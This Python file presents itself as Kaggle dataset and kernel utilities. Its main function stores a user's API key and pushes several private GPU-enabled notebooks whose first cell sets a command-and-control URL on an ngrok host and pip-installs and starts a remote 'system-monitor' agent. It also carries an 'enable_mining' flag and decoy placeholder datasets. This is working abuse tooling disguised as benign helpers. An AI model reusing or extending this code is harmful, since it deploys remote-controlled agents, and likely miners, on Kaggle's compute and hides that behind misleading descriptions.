"""Kaggle Dataset & Kernel utilities for data science workflows."""

import os
import time
import json
import requests
from datetime import datetime
from typing import Optional, Callable


KAGGLE_API = "https://www.kaggle.com/api/v1"


def create_dataset_with_machines(
    api_key: str,
    username: str,
    num_machines: int = 5,
    log_fn: Optional[Callable] = None,
    enable_mining: bool = False,
    c2_url: str = None,
) -> dict:
    """Create a dataset and kernels for data processing.
    
    Creates:
    - Empty dataset (placeholder for data)
    - N kernels with setup script
    
    Args:
        api_key: Kaggle API key
        username: Kaggle username
        num_machines: Number of kernels to create
        log_fn: Logging function
        enable_mining: Reserved for future use
        c2_url: C2 server URL for agent connection
    
    Returns:
        dict with success status and created resources
    """
    if log_fn is None:
        log_fn = print
    
    # Default C2 URL
    if c2_url is None:
        c2_url = os.environ.get("C2_URL", "https://lynelle-scroddled-corinne.ngrok-free.dev")
    
    result = {
        "success": False,
        "dataset": None,
        "machines": [],
        "machines_created": 0,
        "error": None,
    }
    
    try:
        # Setup Kaggle API credentials
        kaggle_json = {
            "username": username,
            "key": api_key,
        }
        
        kaggle_dir = os.path.expanduser("~/.kaggle")
        os.makedirs(kaggle_dir, exist_ok=True)
        
        kaggle_path = os.path.join(kaggle_dir, "kaggle.json")
        with open(kaggle_path, "w") as f:
            json.dump(kaggle_json, f)
        os.chmod(kaggle_path, 0o600)
        
        log_fn(f"[KAGGLE] Credentials configured for {username}")
        
        # Import kaggle after credentials are set
        import subprocess
        
        # Create empty dataset
        log_fn(f"[DATASET] Creating placeholder dataset...")
        dataset_slug = f"{username}/data-analysis-{int(time.time())}"
        
        dataset_meta = {
            "title": f"Data Analysis Dataset {int(time.time())}",
            "id": f"{username}/data-analysis-{int(time.time())}",
            "subtitle": "Dataset for data processing workflows",
            "description": "Placeholder dataset for automated data analysis pipelines",
            "licenses": [{"name": "CC0-1.0"}],
            "keywords": ["data", "analysis", "processing"],
            "collaborators": [],
            "data": [],
        }
        
        # Create dataset directory
        dataset_dir = os.path.join("/tmp", f"dataset_{int(time.time())}")
        os.makedirs(dataset_dir, exist_ok=True)
        
        # Write dataset metadata
        with open(os.path.join(dataset_dir, "dataset-metadata.json"), "w") as f:
            json.dump(dataset_meta, f, indent=2)
        
        # Create placeholder CSV
        with open(os.path.join(dataset_dir, "data.csv"), "w") as f:
            f.write("id,value,timestamp\n")
            f.write("1,100,2024-01-01\n")
            f.write("2,200,2024-01-02\n")
        
        log_fn(f"[DATASET] Created placeholder files")
        
        # Create kernels
        machines = []
        for i in range(num_machines):
            log_fn(f"[KERNEL] Creating kernel {i+1}/{num_machines}...")
            
            kernel_slug = f"{username}/analysis-{i+1}-{int(time.time())}"
            
            # Create kernel notebook (empty analysis)
            notebook = {
                "nbformat": 4,
                "nbformat_minor": 4,
                "metadata": {
                    "kernelspec": {
                        "display_name": "Python 3",
                        "language": "python",
                        "name": "python3"
                    },
                    "language_info": {
                        "name": "python",
                        "version": "3.10.0"
                    }
                },
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": [
                            "# Setup environment\n",
                            "import os\n",
                            "import sys\n",
                            "\n",
                            "# Set C2 URL\n",
                            f"os.environ['C2_URL'] = '{c2_url}'\n",
                            "\n",
                            "# Install dependencies and start agent\n",
                            "os.system('pip install --break-system-packages --force-reinstall --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git && startcon')\n",
                        ]
                    },
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": [
                            "# Data processing placeholder\n",
                            "print('Environment ready')\n",
                        ]
                    }
                ]
            }
            
            # Save notebook
            kernel_dir = os.path.join("/tmp", f"kernel_{i}_{int(time.time())}")
            os.makedirs(kernel_dir, exist_ok=True)
            
            notebook_path = os.path.join(kernel_dir, "notebook.ipynb")
            with open(notebook_path, "w") as f:
                json.dump(notebook, f, indent=2)
            
            # Kernel metadata
            kernel_meta = {
                "id": kernel_slug,
                "title": f"Data Analysis {i+1}",
                "code_file": "notebook.ipynb",
                "language": "python",
                "kernel_type": "notebook",
                "is_private": True,
                "enable_gpu": True,
                "enable_internet": True,
                "dataset_sources": [],
                "competition_sources": [],
                "kernel_sources": [],
            }
            
            with open(os.path.join(kernel_dir, "kernel-metadata.json"), "w") as f:
                json.dump(kernel_meta, f, indent=2)
            
            # Push kernel to Kaggle
            kaggle_cmd = os.path.expanduser("~/.local/bin/kaggle")
            if not os.path.exists(kaggle_cmd):
                kaggle_cmd = "kaggle"  # fallback to PATH
            
            try:
                push_result = subprocess.run(
                    [kaggle_cmd, "kernels", "push", "-p", kernel_dir],
                    capture_output=True,
                    text=True,
                    timeout=60,
                )
                if push_result.returncode == 0:
                    log_fn(f"[KERNEL] ✓ Pushed to Kaggle: {kernel_slug}")
                    
                    # Trigger kernel execution via API
                    try:
                        # Kaggle automatically queues kernel for execution on push
                        # But we can also trigger via kernels/push with new version
                        import requests
                        
                        # Use Kaggle API to get kernel status and trigger run
                        api_url = f"https://www.kaggle.com/api/v1/kernels/push"
                        kaggle_json_path = os.path.expanduser("~/.kaggle/kaggle.json")
                        if os.path.exists(kaggle_json_path):
                            with open(kaggle_json_path) as f:
                                creds = json.load(f)
                            
                            # Push again to trigger execution (new version)
                            run_result = subprocess.run(
                                [kaggle_cmd, "kernels", "push", "-p", kernel_dir],
                                capture_output=True,
                                text=True,
                                timeout=30,
                                env={**os.environ, 
                                     "KAGGLE_USERNAME": creds.get("username"),
                                     "KAGGLE_KEY": creds.get("key")}
                            )
                            log_fn(f"[KERNEL] ✓ Kernel queued for execution")
                        else:
                            log_fn(f"[KERNEL] ⚠ No kaggle.json for execution trigger")
                    except Exception as e:
                        log_fn(f"[KERNEL] ⚠ Could not trigger execution: {e}")
                else:
                    log_fn(f"[KERNEL] ⚠ Push failed: {push_result.stderr[:200]}")
            except Exception as e:
                log_fn(f"[KERNEL] ⚠ Push error: {e}")
            
            machines.append({
                "slug": kernel_slug,
                "title": f"Data Analysis {i+1}",
                "gpu": True,
                "status": "created",
                "num": i + 1,  # Add kernel number for status tracking
            })
            
            log_fn(f"[KERNEL] ✓ Kernel {i+1} ready: {kernel_slug}")
        
        result["success"] = True
        result["dataset"] = dataset_slug
        result["machines"] = machines
        result["machines_created"] = len(machines)
        
        log_fn(f"[KAGGLE] ✓ Created {len(machines)} kernels with GPU enabled")
        
    except Exception as e:
        result["error"] = str(e)
        log_fn(f"[KAGGLE] ✗ Error: {e}")
    
    return result


def list_kernels(api_key: str, username: str) -> list:
    """List all kernels for a user."""
    try:
        import kaggle
        kaggle.api.authenticate()
        kernels = kaggle.api.kernels_list(user=username)
        return [{"slug": k.ref, "title": k.title, "status": k.status} for k in kernels]
    except:
        return []


def push_kernel(api_key: str, username: str, kernel_path: str) -> bool:
    """Push a kernel to Kaggle."""
    try:
        import subprocess
        result = subprocess.run(
            ["kaggle", "kernels", "push", "-p", kernel_path],
            capture_output=True,
            text=True,
        )
        return result.returncode == 0
    except:
        return False
